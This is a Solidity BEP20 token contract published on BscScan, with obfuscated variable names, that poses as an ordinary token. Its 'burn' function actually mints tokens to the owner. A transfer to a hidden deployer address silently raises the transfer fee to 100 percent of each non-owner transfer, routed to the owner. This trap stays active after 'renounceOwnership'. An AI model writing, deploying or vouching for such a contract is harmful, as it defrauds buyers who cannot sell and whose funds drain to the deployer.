/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 07:30:01 GMT
 */
pragma solidity >=0.4.11;
contract OphBKP {
uint256 public  ItGFjn = 1000000000000000000;
uint256 private  SsAzDa = 10000000000000;
address public  GHGcaB = address(0);
string public  symbol = "NlrOmZ";
string public  name = "hOkciH";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  dgeeDW = 100000000000000000000000;
address private  FuZHiL = address(0);
address public  BUbiNd = address(0);
uint256 public  BQefxM = 100000000000000000000;
uint256 public  sAPLGa = 100000000000000000;
address public  aMJVPW = address(0);
address public  LwXFIy = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  LqZwPw = 10000000000000000000000000000;
address public  JPWKDI = address(0);
uint256 public constant qiweRe = 9+1;
uint256 public  BhTFeK = 10000000000000000;
uint256 public  bMkKMi = 10000000000000000000;
uint256 public  XYmKnu = 100000000000000000000000;
address public  YbusXN = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address public owner;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
FuZHiL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PEvLVL");
require(to != address(0), "PEvLVL");
require(amount <= balanceOf[from], "PEvLVL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* qiweRe/SsAzDa ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FuZHiL){
SsAzDa = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}